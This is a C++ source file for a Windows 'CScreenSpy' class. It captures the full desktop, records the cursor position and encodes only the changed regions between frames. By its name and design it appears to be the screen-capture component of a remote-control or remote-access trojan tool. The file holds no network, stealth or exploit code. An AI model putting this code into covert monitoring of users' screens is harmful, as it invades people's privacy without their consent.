#include "stdafx.h"

#include "ScreenSpy.h"


CScreenSpy::CScreenSpy()
{
	_M_Algorithm = ALGORITHM_DIFF;

	
	_M_BitmapCount = 16;
	

	_M_FullWidth  = GetSystemMetrics(SM_CXSCREEN);
	_M_FullHeight = GetSystemMetrics(SM_CYSCREEN);

	_M_BitmapInfo = OnInitBitmapInfo(_M_BitmapCount, _M_FullWidth, _M_FullHeight);


	// 获得屏幕句柄
	_M_hDesktopWnd = GetDesktopWindow();
	_M_hDesktopDC  = GetDC(_M_hDesktopWnd);



	_M_hDesktopMemoryDC = CreateCompatibleDC(_M_hDesktopDC);
	_M_hBitmap = CreateDIBSection(
						_M_hDesktopDC,
						_M_BitmapInfo,
						DIB_RGB_COLORS,
						&_M_BitmapData,
						NULL,
						NULL
					);
	SelectObject(_M_hDesktopMemoryDC, _M_hBitmap);



	_M_hDiffMemoryDC = CreateCompatibleDC(_M_hDesktopDC);
	_M_hDiffBitmap = CreateDIBSection(
							_M_hDesktopDC, 
							_M_BitmapInfo,
							DIB_RGB_COLORS, 
							&_M_DiffBitmapData, 
							NULL, 
							NULL
					);
	SelectObject(_M_hDiffMemoryDC, _M_hDiffBitmap);

	_M_offset = 0;
	_M_BufferData = new BYTE[_M_BitmapInfo->bmiHeader.biSizeImage * 2];
	return;
}

CScreenSpy::CScreenSpy(ULONG BitmapCount)
{
	_M_Algorithm = ALGORITHM_DIFF;

	switch (BitmapCount)
	{
	case 16:
	case 32:
	{
		_M_BitmapCount = BitmapCount;
		break;
	}
	default:
	{
		_M_BitmapCount = 16;
		break;
	}
	}

	_M_FullWidth  = GetSystemMetrics(SM_CXSCREEN);
	_M_FullHeight = GetSystemMetrics(SM_CYSCREEN);

	_M_BitmapInfo = OnInitBitmapInfo(BitmapCount,_M_FullWidth,_M_FullHeight);


	// 获得屏幕句柄
	_M_hDesktopWnd = GetDesktopWindow();
	_M_hDesktopDC  = GetDC(_M_hDesktopWnd);



	_M_hDesktopMemoryDC = CreateCompatibleDC(_M_hDesktopDC);
	_M_hBitmap = CreateDIBSection(
						_M_hDesktopDC,
						_M_BitmapInfo,
						DIB_RGB_COLORS, 
						&_M_BitmapData, 
						NULL,NULL
					);
	SelectObject(_M_hDesktopMemoryDC, _M_hBitmap);



	_M_hDiffMemoryDC = CreateCompatibleDC(_M_hDesktopDC);
	_M_hDiffBitmap   = CreateDIBSection(
						_M_hDesktopDC,
						_M_BitmapInfo,
						DIB_RGB_COLORS,
						&_M_DiffBitmapData,
						NULL, NULL
					);
	SelectObject(_M_hDiffMemoryDC, _M_hDiffBitmap);


	_M_offset = 0;
	_M_BufferData = new BYTE[_M_BitmapInfo->bmiHeader.biSizeImage * 2];

	return;

}

CScreenSpy::~CScreenSpy()
{
	ReleaseDC(_M_hDesktopWnd, _M_hDesktopDC);

	if (_M_hDesktopMemoryDC != NULL)
	{
		DeleteDC(_M_hDesktopMemoryDC);
		DeleteObject(_M_hDiffBitmap);

		if (_M_BitmapData != NULL)
		{
			_M_BitmapData = NULL;
		}
		_M_hDesktopMemoryDC = NULL;
		
	}

	if (_M_hDiffMemoryDC != NULL)
	{
		DeleteDC(_M_hDiffMemoryDC);
		DeleteObject(_M_hDiffBitmap);
		if (_M_DiffBitmapData != NULL)
		{
			_M_DiffBitmapData = NULL;
		}
	}

	if (_M_BitmapInfo != NULL)
	{
		delete[] _M_BitmapInfo;
		_M_BitmapInfo = NULL;
	}

	if (_M_BufferData != NULL)
	{
		delete[] _M_BufferData;
		_M_BufferData = NULL;
	}

	_M_offset = 0;
}


LPBITMAPINFO CScreenSpy::OnInitBitmapInfo(ULONG BitmapCount, ULONG FullWidth, ULONG FullHeight)
{
	// [BITMAPINFOHEADER]

	ULONG     BufferLength = sizeof(BITMAPINFOHEADER);
	BITMAPINFO* BitmapInfo = (BITMAPINFO*)new BYTE[BufferLength];

	BITMAPINFOHEADER* BitmapInfoHeader = &(BitmapInfo->bmiHeader);

	BitmapInfoHeader->biSize   = sizeof(BITMAPINFOHEADER);
	BitmapInfoHeader->biWidth  = FullWidth;
	BitmapInfoHeader->biHeight = FullHeight;
	BitmapInfoHeader->biPlanes = 1;
	BitmapInfoHeader->biBitCount = static_cast<WORD>(BitmapCount);
	BitmapInfoHeader->biCompression   = BI_RGB;
	BitmapInfoHeader->biXPelsPerMeter = 0;
	BitmapInfoHeader->biYPelsPerMeter = 0;
	BitmapInfoHeader->biClrImportant  = 0;
	BitmapInfoHeader->biClrUsed   = 0;
	BitmapInfoHeader->biSizeImage =
		((BitmapInfoHeader->biWidth*BitmapInfoHeader->biBitCount + 31) / 32) 
					* 4 * (BitmapInfoHeader->biHeight);


	return BitmapInfo;


}

LPBITMAPINFO CScreenSpy::GetBitmapInfoData()
{
	return _M_BitmapInfo;
}

ULONG  CScreenSpy::GetBitmapInfoSize()
{
	return (sizeof(BITMAPINFOHEADER));
}

LPVOID CScreenSpy::GetFirstScreenData()
{
	::BitBlt(
		_M_hDesktopMemoryDC, 
		0, 0, 
		_M_FullWidth, 
		_M_FullHeight,
		_M_hDesktopDC, 
		0, 0, SRCCOPY
	);


	return _M_BitmapData;
}

ULONG  CScreenSpy::GetFirstScreenDataSize()
{
	return _M_BitmapInfo->bmiHeader.biSizeImage;
}

LPVOID CScreenSpy::GetNextScreenData(ULONG *ScreenDataSize)
{
	if (ScreenDataSize == NULL || _M_BufferData == NULL)
	{
		return NULL;
	}
	 
	_M_offset = 0;

	WriteScreenData((LPBYTE)&_M_Algorithm, sizeof(_M_Algorithm));

	POINT CursorPos;
	GetCursorPos(&CursorPos);
	WriteScreenData((LPBYTE)&CursorPos, sizeof(POINT));
	
	BYTE CursorIndex = -1;
	WriteScreenData(&CursorIndex, sizeof(BYTE));

	if (_M_Algorithm == ALGORITHM_DIFF)
	{
		ScanScreen(
				_M_hDiffMemoryDC, 
				_M_hDesktopDC,
				_M_BitmapInfo->bmiHeader.biWidth,
				_M_BitmapInfo->bmiHeader.biHeight
				);
		
		*ScreenDataSize = _M_offset + 
			CompareBitmap(
					(LPBYTE)_M_DiffBitmapData, 
					(LPBYTE)_M_BitmapData,
					_M_BufferData + _M_offset, 
					_M_BitmapInfo->bmiHeader.biSizeImage
				);

		// _M_BufferData => [_M_Algorithm][POINT][CursorIndex]
		//                  [Pos][Count][Data]|[Pos][Count][Data]|[Pos][Count][Data]...
		return _M_BufferData;
	}


	return NULL;
}

VOID   CScreenSpy::WriteScreenData(LPBYTE BufferData, ULONG BufferLength)
{
	memcpy(_M_BufferData + _M_offset, BufferData, BufferLength);
	_M_offset += BufferLength;
	
	return;
}

VOID   CScreenSpy::ScanScreen(HDC hDstDC, HDC hSrcDC, ULONG Width, ULONG Height)
{
	
	ULONG JumpLine  =  50;
	ULONG JumpSleep =  JumpLine / 10;


	ULONG Residue   =  Height;

	for (ULONG i = 0, ToJump = 0; i < Height; i += ToJump)
	{
		Residue = Height - i;
		if (Residue > JumpLine)
		{
			ToJump = JumpLine;
		}	
		else
		{
			ToJump = Residue;
		}	

		BitBlt(hDstDC, 0, i, Width, ToJump, hSrcDC, 0, i, SRCCOPY);
		Sleep(JumpSleep);
	}

	return;
}

ULONG  CScreenSpy::CompareBitmap(LPBYTE NextScreenData, LPBYTE FirstScreenData,
								 LPBYTE BufferData, ULONG  ScreenDataSize)
{
	// x86寄存器长度32位, 以DWORD效率最高
	LPDWORD	CurrData, NextData;
	CurrData = (LPDWORD)FirstScreenData;
	NextData = (LPDWORD)NextScreenData;


	ULONG offset = 0, v11 = 0, v22 = 0;
	ULONG Count  = 0;

	for (ULONG i = 0; i < ScreenDataSize; i += sizeof(DWORD), CurrData++, NextData++)
	{
		if (*CurrData == *NextData)
		{
			continue;
		}


	
		*(LPDWORD)(BufferData + offset) = i;
		
		v11 = offset + sizeof(DWORD);  //4
		v22 = v11 + sizeof(DWORD);     //8

		Count = 0; 

				  
		*CurrData = *NextData;
		*(LPDWORD)(BufferData + v22 + Count) = *NextData;

		Count += sizeof(DWORD);
		i     += sizeof(DWORD);
		CurrData++, NextData++;

		for (ULONG j = i; j < ScreenDataSize; j += sizeof(DWORD), i += sizeof(DWORD), CurrData++, NextData++)
		{
			if (*CurrData == *NextData)
				break;

			*CurrData = *NextData;
			*(LPDWORD)(BufferData + v22 + Count) = *NextData;
			Count += sizeof(DWORD);
		}
	
		*(LPDWORD)(BufferData + v11) = Count;

		offset = v22 + Count;
	}

	return offset;
}